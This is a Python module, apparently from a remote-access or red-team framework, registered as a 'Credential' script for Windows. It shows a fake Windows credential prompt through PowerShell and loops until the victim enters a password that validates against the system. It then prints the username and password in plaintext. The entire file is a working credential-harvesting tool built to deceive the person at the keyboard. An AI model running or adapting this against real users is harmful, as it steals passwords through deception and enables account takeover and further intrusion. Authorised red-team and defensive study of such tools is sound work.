SCRIPT_METADATA = {
    "name": "win/cred/prompt_credentials",
    "display_name": "Prompt for Credentials",
    "description": "Display a Windows credential prompt and validate the entered credentials, looping until valid",
    "platforms": ["windows"],
    "category": "Credential",
    "params": []
}

import subprocess
from client.runtime.win_util import logon_user

print("Waiting for valid credentials...")

while True:
    command = r'$cred=$Host.UI.PromptForCredential($null,$null,$env:username,$null);' \
              r'if($cred) {echo $cred.GetNetworkCredential().UserName $cred.GetNetworkCredential().Password} ' \
              r'else {echo `n} '

    result = subprocess.run(f'powershell.exe {command}', shell=True, capture_output=True, text=True)

    if result.stderr:
        print(f'Error: {result.stderr}')
        break

    lines = result.stdout.strip().splitlines()
    if len(lines) >= 2:
        username, password = lines[0], lines[1] if len(lines) > 1 else ''

        if logon_user(username, password):
            print(f'✓ Valid credentials: {username}:{password}')
            break
        else:
            print(f'✗ Invalid credentials: {username}:{password}')
    else:
        print('No credentials entered')